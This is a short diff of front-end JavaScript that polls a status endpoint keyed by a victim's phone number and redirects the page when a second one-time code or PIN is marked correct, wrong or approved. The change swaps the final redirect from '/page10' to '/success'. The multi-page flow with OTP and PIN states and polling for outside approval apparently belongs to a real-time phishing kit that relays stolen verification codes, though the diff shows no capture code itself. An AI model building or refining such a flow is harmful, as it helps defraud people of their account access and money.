@@ -400,10 +400,10 @@ document.addEventListener("DOMContentLoaded", () => {
                 const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
                 const data = await res.json();
 
-                // Final verification success -> Proceed to page 10
-                if (data.status === "otp2_correct" || data.status === "approved") {
+                // Final verification success -> Redirect to success page / page10
+                if (data.status === "otp2_correct" || data.status === "approved" || data.status === "success") {
                     clearInterval(checkInterval);
-                    window.location.href = "/page10";
+                    window.location.href = "/success"; // Redirects to /success route (or /page10)
                 } 
                 // Incorrect PIN -> Redirect back to PIN entry step
                 else if (data.status === "otp2_wrongpin" || data.status === "pin_wrong") {
